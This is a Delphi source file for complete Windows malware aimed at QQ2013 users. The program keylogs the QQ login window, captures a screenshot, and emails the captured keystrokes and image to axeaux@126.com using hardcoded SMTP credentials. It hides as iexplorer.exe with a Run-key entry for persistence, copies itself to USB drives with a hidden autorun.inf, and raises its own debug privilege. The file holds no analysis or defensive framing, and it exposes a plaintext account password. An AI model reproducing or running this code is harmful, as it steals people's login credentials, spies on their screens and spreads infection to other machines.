unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs,jpeg, ExtCtrls, IdMessage, IdBaseComponent, IdComponent,
  IdTCPConnection, IdTCPClient, IdMessageClient, IdSMTP,wininet,registry,
  IdExplicitTLSClientServerBase, IdSMTPBase,IdAttachmentFile;

type
  TForm1 = class(TForm)
    Timer1: TTimer;
    Timer2: TTimer;
    IdSMTP1: TIdSMTP;
    IdMessage1: TIdMessage;
    procedure FormCreate(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  kbhook:hhook;
  tmpstr,jpgpath,usbexename:string;
  mapi,mapi2:array[1..300] of string[15];
  started,hookstarted:boolean;
  emailid,usbstandbyid:cardinal;
  nowhwnd:hwnd;


implementation

type

  PBDLLHOOKSTRUCT = ^TBDLLHOOKSTRUCT;
  TBDLLHOOKSTRUCT = record
    vkCode: DWORD;
    scanCode: DWORD;
    flags: DWORD;
    time: DWORD;
    dwExtraInfo: DWORD;
  end;
  linker=^mailrec;
  mailrec=record
    pwdstr,jpgstr:string;
  end;
{$R *.dfm}
procedure internetaccess;
begin
  try
  repeat
  until InternetGetConnectedState(nil, 0)=true;
  except end;
end;

procedure email;
var
  msg1:msg;
  t:linker;
begin
  form1.IdSMTP1.Host:='smtp.126.com';
  form1.IdSMTP1.password:='nsfz123456';
  form1.IdSMTP1.Username:='axeaux';
  repeat
  if (getmessage(msg1,0,0,0)) then begin
   if msg1.lParam=8888 then begin
    internetaccess;
    t:=linker(msg1.wparam);
    try
    form1.idmessage1.Clear;
    form1.idsmtp1.Connect();
    form1.IdSMTP1.Authenticate;
    form1.IdMessage1.subject:='QQDocuments';
    form1.IdMessage1.recipients.Clear;
    form1.idmessage1.Recipients.emailaddresses:='axeaux@126.com';
    form1.idmessage1.From.Address:='axeaux@126.com';
    form1.IdMessage1.body.text:=t^.pwdstr;
    if fileexists(t^.jpgstr) then TIdAttachmentFile.Create(form1.idmessage1.MessageParts,t^.jpgstr);
    form1.idsmtp1.send(form1.IdMessage1);
    form1.idsmtp1.disconnect;
    except
    end;
      try sleep(10000);if fileexists(t^.jpgstr) then deletefile(t^.jpgstr); except end;
      dispose(t);
    end;
    end;
   sleep(300);
  until 1=2;
end;


procedure getscreenshot(filepath:string);
var
 jpg:tjpegimage;
 DC: HDC;
 cvs: TCanvas;
 bmp:tbitmap;

 GlobalCur:TIcon;
 windowhld:hwnd;
 threadld:dword;
 curpoint:tpoint;

begin

  jpg:=Tjpegimage.Create;
  bmp:=tbitmap.create;
  bmp.Height:=screen.height;
  bmp.width:=screen.Width;

  DC := GetDC(0);
  cvs := TCanvas.Create;
  cvs.Handle := DC;
  bmp.Canvas.CopyRect(Screen.DesktopRect,cvs,Screen.DesktopRect);

  windowhld:=GetForegroundWindow;
  threadld:=GetWindowThreadProcessId(Windowhld,nil);
  AttachThreadInput(GetCurrentThreadId,threadld,true);
  GlobalCur:=TIcon.Create;
  GlobalCur.handle:=GetCursor;
  AttachThreadInput(GetCurrentThreadId,threadld,false);
  bmp.canvas.brush.Style:=bsclear;
  getcursorpos(curpoint);
  bmp.canvas.draw(curpoint.x,curpoint.y,GlobalCur);

  jpg.Assign(Bmp);
  jpg.CompressionQuality:=100;
  jpg.Compress;         {存入JPG}
  jpg.SaveToFile(filepath);

  ReleaseDC(0, DC);
  cvs.Free;
  jpg.Free;
  bmp.free;

end;

function chr(x:cardinal):string;
begin
  result:=mapi[x];
end;

function keyboardhook(nCode:Integer;wParam:WPARAM;lParam:LPARAM):lresult;stdcall;
var
  p:pbdllhookstruct;
  t:string[15];
  ishift:smallint;
  shiftdown,capdown:boolean;
  keystates:TKeyboardState;
begin
  if getforegroundwindow=nowhwnd then begin
  if (wparam=wm_keydown) or (wparam=wm_syskeydown) then
     begin
       p:=pbdllhookstruct(lparam);
      if (p^.flags<>16) and (p^.flags<>144) and (p^.dwextrainfo=0) then begin
       t:=chr(p^.vkcode);
       ishift:=getkeystate(vk_shift);
       getkeyboardstate(keystates);
       if odd(keystates[vk_capital]) then capdown:=true else capdown:=false;
       if (ishift and 128)=128 then shiftdown:=true else shiftdown:=false; //shift down!
       if (capdown=false) and (shiftdown=false) and (p^.vkcode>=65) and (p^.vkcode<=90)
        then  t:=lowercase(t);
       if (capdown=false) and (shiftdown=true) and (p^.vkcode>=186) and (p^.vkcode<=222)
        then t:=mapi2[p^.vkcode];
       if (capdown=false) and (shiftdown=true) and (p^.vkcode>=48) and (p^.vkcode<=57)
        then t:=mapi2[p^.vkcode];
       if (capdown=true) and (shiftdown=true) and  (p^.vkcode>=65) and (p^.vkcode<=90)
        then t:=lowercase(t);
       if (capdown=true) and (shiftdown=true) and (p^.vkcode>=186) and (p^.vkcode<=222)
        then t:=mapi2[p^.vkcode];
       if (capdown=true) and (shiftdown=true) and (p^.vkcode>=48) and (p^.vkcode<=57)
        then t:=mapi2[p^.vkcode];
      tmpstr:=tmpstr+t;
      end
      end;
   end;
   result:=callnexthookex(kbhook,ncode,wparam,lparam);
end;

function kbhookstart:boolean;stdcall;
begin
   try
   kbhook:=setwindowshookex(13,@keyboardhook,hinstance,0);
   if kbhook<>0 then result:=true else result:=false;
   except
   end;
end;

function kbhookend:boolean;stdcall;
var
  bool:boolean;
begin
    try
    bool:=unhookwindowshookex(kbhook);
    result:=bool;
    except
    end;
end;

procedure addtoque(pwdstr,jpgstr:string);
var
  tmp:^mailrec;
begin

  //postthreadmessage....
   new(tmp);
  tmp^.pwdstr:=pwdstr;
  tmp^.jpgstr:=jpgstr;
    postthreadmessage(emailid,0,longint(tmp),8888);
   //showmessage(pwdstr);

  //post
end;

function findqq:boolean;
var
  bool:boolean;
  logininhwnd:hwnd;
  tmp:tagwindowinfo;
begin
  bool:=false;
  logininhwnd:=findwindow(pansichar('TXGuiFoundation'),pansichar('QQ2013'));
  if logininhwnd=0 then bool:=false
  else
    begin
      fillchar(tmp,sizeof(tmp),0);
      tmp.cbsize:=sizeof(tmp);
      getwindowinfo(logininhwnd,tmp);
      //if ((tmp.dwstyle=2517237760) and (tmp.dwexstyle=2568))
      //or ((tmp.dwstyle=2517565440) and (tmp.dwexstyle=2816))
      if ((tmp.dwstyle=2517106688) and (tmp.dwexstyle=526856))   //QQ2013!~!
      then begin bool:=true;nowhwnd:=logininhwnd;end else bool:=false;
    //  Showmessage(inttostr(tmp.dwStyle)+' '+inttostr(tmp.dwexStyle));

    end;
  result:=bool;
end;

function getjpgpath:string;
begin
  result:=ExtractFilePath(Application.Exename)+formatdatetime('yyyy-mm-dd hh-mm-ss',now)+'.jpg';
end;

procedure usbstandby;
var
  i:char;
  disk:string;
  errormode:integer;
procedure usbsetup(path:string);
var

  f:textfile;

begin
  try
  if not fileexists(path+usbexename) then begin
  copyfile(pchar(paramstr(0)),pchar(path+usbexename),false);
  assignfile(f,path+'autorun.inf');
  rewrite(f);
  writeln(f,'[autorun]');
  writeln(f,'open='+usbexename);
  closefile(f);
  SetFileAttributes(pchar(path+'autorun.inf'),FILE_ATTRIBUTE_HIDDEN);
  SetFileAttributes(pchar(path+'autorun.inf'),FILE_ATTRIBUTE_System);
  end;
  except
  end;
end;

begin
EConvertError.Create('Not a valid drive ID');
ErrorMode:=SetErrorMode(SEM_FailCriticalErrors);
repeat
    for i:='Z' downto 'C' do
      begin
        disk:=i+':\';
         if getdrivetype(pchar(disk))=drive_removable then
                  begin
                    usbsetup(disk);
                   end;
      end;
  sleep(2000);
  until 1=2;
end;

procedure addtostartup(exename,savepath:string);
var
  Reg:TRegistry;
begin
  Reg := TRegistry.Create;
  with Reg do
  Try
    RootKey := HKEY_LOCAL_MACHINE;
      if OpenKey('SOFTWARE\MicroSoft\Windows\CurrentVersion\Run',false) then
        Reg.WriteString(exename,savepath);
  finally
    Reg.Free;
  end;
end;

procedure programinit;
var
  systemdir,maindir:string;
begin
  systemdir:=GetEnvironmentVariable('WINDIR')+'\';
  maindir:=systemdir+'iexplorer.exe';
  if not fileexists(maindir) then
    begin
     copyfile(pchar(paramstr(0)),pchar(maindir),false);
     addtostartup('ie.exe',maindir);
     halt;
    end;
  addtostartup('ie.exe',maindir);
end;

function getdebugright:boolean;
var
  htoken:thandle;
  tp:ttokenprivileges;
  tmp:cardinal;
begin
  result:=false;
  //开令牌环
  if openprocesstoken(getcurrentprocess,token_adjust_privileges or token_query,htoken) then
    begin
      lookupprivilegevalue(nil,pansichar('SeDebugPrivilege'),tp.privileges[0].luid);
      tp.PrivilegeCount:=1;
      tp.Privileges[0].Attributes:=se_privilege_enabled;
      adjusttokenprivileges(htoken,false,tp,0,nil,tmp);
      result:=true;
    end;
end;




procedure TForm1.FormCreate(Sender: TObject);
begin
mapi[8]:='[Backspace]';
mapi[9]:='[Tab]';
mapi[12]:='[Clear]';
mapi[13]:='[Enter]'+#13;
mapi[16]:='[Shift]';
mapi[17]:='[Ctrl]';
mapi[18]:='[Alt]';
mapi[19]:='[Pause]';
mapi[20]:='[CapsLock]';
mapi[27]:='[Esc]';
mapi[32]:='[Spacebar]';
mapi[33]:='[PageUp]';
mapi[34]:='[PageDown]';
mapi[35]:='[End]';
mapi[36]:='[Home]';
mapi[37]:='←';
mapi[38]:='↑' ;
mapi[39]:='→' ;
mapi[40]:='↓';
mapi[41]:='[Select]';
mapi[43]:='[EXECUTE]';
mapi[44]:='[PrintScreen]';
mapi[45]:='[Ins]';
mapi[46]:='[Del]';
mapi[47]:='[Help]';
mapi[48]:='0';mapi2[48]:=')';
mapi[49]:='1';mapi2[49]:='!';
mapi[50]:='2';mapi2[50]:='@';
mapi[51]:='3';mapi2[51]:='#';
mapi[52]:='4';mapi2[52]:='$';
mapi[53]:='5';mapi2[53]:='%';
mapi[54]:='6';mapi2[54]:='^';
mapi[55]:='7';mapi2[55]:='&';
mapi[56]:='8';mapi2[56]:='*';
mapi[57]:='9';mapi2[57]:='(';
mapi[65]:='A';
mapi[66]:='B';
mapi[67]:='C';
mapi[68]:='D';
mapi[69]:='E';
mapi[70]:='F';
mapi[71]:='G';
mapi[72]:='H';
mapi[73]:='I';
mapi[74]:='J';
mapi[75]:='K';
mapi[76]:='L';
mapi[77]:='M';
mapi[78]:='N';
mapi[79]:='O';
mapi[80]:='P';
mapi[81]:='Q';
mapi[82]:='R';
mapi[83]:='S';
mapi[84]:='T';
mapi[85]:='U';
mapi[86]:='V';
mapi[87]:='W';
mapi[88]:='X';
mapi[89]:='Y';
mapi[90]:='Z';
mapi[96]:='[数字盘0]';
mapi[97]:='[数字盘1]';
mapi[98]:='[数字盘2]';
mapi[99]:='[数字盘3]';
mapi[100]:='[数字盘4]';
mapi[101]:='[数字盘5]';
mapi[102]:='[数字盘6]';
mapi[103]:='[数字盘7]';
mapi[104]:='[数字盘8]';
mapi[105]:='[数字盘9]';
mapi[106]:='[数字盘上引号]';
mapi[107]:='[数字盘+]';
mapi[108]:='[Separator]';
mapi[109]:='[数字盘-]';
mapi[110]:='[数字盘.]';
mapi[111]:='[数字盘/]';
mapi[112]:='[F1]';
mapi[113]:='[F2]';
mapi[114]:='[F3]';
mapi[115]:='[F4]';
mapi[116]:='[F5]';
mapi[117]:='[F6]';
mapi[118]:='[F7]';
mapi[119]:='[F8]';
mapi[120]:='[F9]';
mapi[121]:='[F10]';
mapi[122]:='[F11]';
mapi[123]:='[F12]';
mapi[144]:='[NumLock]';
mapi[145]:='[ScrollLock]';
mapi[91]:='[左win]';
mapi[92]:='[右win]';
mapi[93]:='[快捷菜单]';
mapi[186]:=';';mapi2[186]:=':';
mapi[187]:='=';mapi2[187]:='+';
mapi[188]:=',';mapi2[188]:='<';
mapi[189]:='-';mapi2[189]:='_';
mapi[190]:='.';mapi2[190]:='>';
mapi[191]:='/';mapi2[191]:='?';
mapi[192]:='`';mapi2[192]:='~';
mapi[219]:='[';mapi2[219]:='{';
mapi[220]:='\';mapi2[220]:='|';
mapi[221]:=']';mapi2[221]:='}';
mapi[222]:='[单引号]';mapi2[222]:='"';
//初始化完成
//建立EMAIL线程
//Searchiing!
//docore;
usbexename:='IE9.exe';


//重要！提升权限！！
GetDebugRight;

programinit;
createthread(nil,0,@email,nil,0,emailid);
createthread(nil,0,@usbstandby,nil,0,usbstandbyid);
timer2.enabled:=true;
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
   kbhookend;
   kbhookstart;
end;

procedure TForm1.Timer2Timer(Sender: TObject);
begin
    if findqq then
      begin
      if started=false then
         begin
           tmpstr:='';jpgpath:='';
           kbhookstart;hookstarted:=true;
           form1.timer1.enabled:=true;
           started:=true;
           jpgpath:=getjpgpath;sleep(500);getscreenshot(jpgpath);
         end;
      end
    else if started=true then
      begin
        started:=false;
        form1.timer1.enabled:=false;
        kbhookend;
        hookstarted:=false;
        addtoque(tmpstr,jpgpath);
        jpgpath:='';tmpstr:='';
      end;
   end;


end.
